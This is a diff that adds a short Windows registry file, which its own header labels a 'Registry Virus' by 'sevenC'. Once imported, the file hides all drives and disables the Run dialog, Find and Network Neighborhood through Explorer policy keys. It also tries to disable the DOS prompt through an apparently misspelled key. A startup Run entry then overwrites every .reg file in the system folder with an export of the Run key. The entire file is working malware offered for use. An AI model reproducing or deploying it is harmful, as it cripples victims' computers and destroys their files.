@@ -1,0 +1,18 @@
+REGEDIT4
+;;%%%%%%%%%%%%%%%%%%%%%%;;
+;;Reg.Hide By sevenC;;
+;;Creditz for Lys Kovick;;
+;;Registry Virus;;
+;;%%%%%%%%%%%%%%%%%%%%%%;;
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldAQpp]
+"Disabled"=dword:1
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoFind"=dword:1
+"NoRun"=dword:1
+"NoDrives"=dword:67108863
+"NoNetHood"=dword:1
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
+@="command /c for %i in (%windir%\\system\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
